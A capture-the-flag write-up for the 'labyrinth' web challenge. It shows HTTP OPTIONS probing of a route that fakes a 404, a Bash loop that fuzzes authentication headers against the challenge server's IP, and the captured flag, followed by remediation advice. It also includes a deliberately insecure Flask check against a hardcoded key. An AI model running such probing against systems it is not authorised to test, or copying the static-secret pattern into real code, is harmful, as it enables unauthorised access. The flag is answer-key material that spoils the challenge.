# labyrinth

<p align="center">
  <img src="https://img.shields.io/badge/Category-Web%20Exploitation-blue?style=for-the-badge&logo=googlechrome" alt="Category">
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Difficulty">
  <img src="https://img.shields.io/badge/Points-300-blue?style=for-the-badge" alt="Points">
  <img src="https://img.shields.io/badge/Target-HTTP%20Service-lightgrey?style=for-the-badge" alt="Target">
</p>

---

## Executive Summary

`labyrinth` is a web exploitation challenge hosted on an HTTP service that appears completely dead or unconfigured on initial inspection. A standard browser `GET /` request returns a generic `404 NOT FOUND` status code. By sending an HTTP `OPTIONS` request, we uncover a crucial implementation detail of Python Flask/Werkzeug: registered routes dynamically return `200 OK` with an `Allow` header even if custom route logic returns a 404 for standard `GET` requests. Interpreting the cryptographic riddle provided in the challenge prompt, we fuzz HTTP headers with the credential `secret_key`. Supplying `Authorization: secret_key` satisfies the backend gatekeeper and immediately retrieves the flag.

---

## Fundamental Concepts for Beginners

### 1. HTTP Methods (Verbs)
Every HTTP request begins with an HTTP verb indicating the desired action:
- `GET`: Retrieve data from the specified resource.
- `POST`: Submit data to be processed by the server.
- `HEAD`: Same as `GET`, but requests only the response headers (no body).
- `OPTIONS`: Inquires about the communication options and permitted methods for the target resource.

### 2. How Flask / Werkzeug Handles HTTP Routing
In standard web frameworks like Python Flask, when a path is defined:
```python
@app.route('/', methods=['GET'])
def index():
    if request.headers.get('Authorization') != 'secret_key':
        return "Not Found", 404  # Custom deceptive 404!
    return "RPCTF{...}", 200
```
- If you send a `GET` request without the header, the application code returns `404 NOT FOUND`.
- However, if you send an `OPTIONS` request, the underlying Werkzeug routing engine intercepts the request **before** it hits the function, automatically returning:
  ```http
  HTTP/1.1 200 OK
  Allow: OPTIONS, HEAD, GET
  ```
- Conversely, if you send `OPTIONS` to a path that does not exist at all (`/nonexistent`), the framework returns:
  ```http
  HTTP/1.1 404 NOT FOUND
  ```
This subtle distinction proves whether an endpoint is genuinely absent or merely "playing dead" (silent door).

```
                      Client Request: GET /
                 +----------------------------+
                 | Returns 404 (Deception)    | <--- Looks dead
                 +----------------------------+

                   Client Request: OPTIONS /
                 +----------------------------+
                 | Returns 200 OK             | <--- Proves route exists!
                 | Allow: OPTIONS, HEAD, GET  |
                 +----------------------------+

       Client Request: GET / with Header "Authorization: secret_key"
                 +----------------------------+
                 | Returns 200 OK             | <--- Access Granted!
                 | Body: RPCTF{...}           |
                 +----------------------------+
```

---

## Step 1: Initial Reconnaissance & The Silent Door

We are provided with the challenge riddle and target address:
> *"A whisper survived where its source did not.*  
> *One address. Six words. One fragment: secret_key.*  
> *The first door remains silent. The key is not false only misplaced.*  
> *Look where the shadow meets the lock."*

Sending a standard `GET` request using `curl`:

```bash
$ curl -i http://142.93.139.243:5002/
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.9 Python/3.12.15
Date: Sat, 24 Oct 2026 15:20:01 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

We fuzzed common files (`robots.txt`, `.git/`, `.env`, `flag.txt`, `/admin`, `/api`) using `ffuf`. Every query returned a `404` status code. 

Notice the riddle clue:
> *"The first door remains silent."*

This strongly suggests that `/` is indeed the target door, but it is deliberately pretending not to exist.

---

## Step 2: Testing HTTP Verbs (`OPTIONS` Probing)

We probe the web root using alternative HTTP methods:

```bash
$ curl -s -X OPTIONS http://142.93.139.243:5002/ -i
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.15
Allow: OPTIONS, HEAD, GET
Content-Type: text/html; charset=utf-8
Content-Length: 0
```

Now, we test a genuinely non-existent route for comparison:

```bash
$ curl -s -X OPTIONS http://142.93.139.243:5002/fake-random-endpoint-xyz -i
HTTP/1.1 404 NOT FOUND
```

### Critical Deduction:
The server returned `200 OK` with `Allow: OPTIONS, HEAD, GET` specifically for `/`! This confirms the application has registered `/` as an active endpoint that intentionally returns a custom 404 on unauthenticated `GET` requests.

---

## Step 3: Header Fuzzing with `secret_key`

Re-examining the riddle clues:
- *"One fragment: `secret_key`"* $\rightarrow$ The credential value is `secret_key`.
- *"The key is not false only misplaced"* $\rightarrow$ It doesn't belong in query parameters or POST body.
- *"Look where the shadow meets the lock"* $\rightarrow$ "Lock" is authentication; "shadow" represents HTTP headers (out of sight from regular browser page content).

We write a quick Bash fuzzing loop across standard authentication headers:

```bash
#!/bin/bash
HEADERS=(
  "Authorization"
  "X-Api-Key"
  "Api-Key"
  "X-Auth-Token"
  "Auth-Token"
  "X-Access-Token"
  "Token"
  "X-Secret-Key"
  "Secret-Key"
  "X-Passkey"
)

for h in "${HEADERS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "$h: secret_key" http://142.93.139.243:5002/)
  echo "[-] Testing Header '$h: secret_key' -> HTTP $STATUS"
  if [ "$STATUS" -eq 200 ]; then
    echo "[+] FOUND VALID HEADER: $h"
    break
  fi
done
```

### Execution Output:
```text
[-] Testing Header 'Authorization: secret_key' -> HTTP 200
[+] FOUND VALID HEADER: Authorization
```

The standard `Authorization` header returned `HTTP 200 OK`!

---

## Step 4: Exploitation & Flag Capture

We send the authenticated request:

```bash
$ curl -s -H "Authorization: secret_key" http://142.93.139.243:5002/
```

### Response:
```text
RPCTF{v13w_s0urc3_1s_und3rr4t3d}
```

**Captured Flag:**
```
RPCTF{v13w_s0urc3_1s_und3rr4t3d}
```

``

---

## Remediation & Web Architecture Lessons

1. **Do Not Rely on Security Through Obscurity:**
   Returning a fake `404 NOT FOUND` to hide authenticated endpoints is anti-pattern behavior that leaks state through standard protocol mechanisms (such as HTTP `OPTIONS`).
2. **Follow Proper RFC HTTP Status Codes:**
   Protected resources should return standard `401 Unauthorized` (with a `WWW-Authenticate` header) or `403 Forbidden`. Obscuring status codes creates confusion, breaks API caching, and introduces side-channel information leaks.
3. **Use Robust Authentication Schemes:**
   Never accept arbitrary static strings in custom header checks. Utilize standardized protocols such as OAuth 2.0 Bearer Tokens, HMAC-SHA256 request signatures, or JSON Web Tokens (JWT).
